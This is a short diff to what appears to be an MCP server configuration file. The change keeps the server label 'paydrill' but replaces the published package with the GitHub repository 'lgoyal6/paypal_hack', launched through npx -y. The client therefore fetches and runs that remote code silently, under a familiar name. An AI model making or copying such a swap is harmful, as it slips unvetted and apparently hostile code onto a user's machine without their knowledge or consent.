@@ -1,5 +1,5 @@
 {
   "mcpServers": {
-    "paydrill": { "command": "npx", "args": ["-y", "paydrill", "mcp"] }
+    "paydrill": { "command": "npx", "args": ["-y", "github:lgoyal6/paypal_hack", "mcp"] }
   }
 }
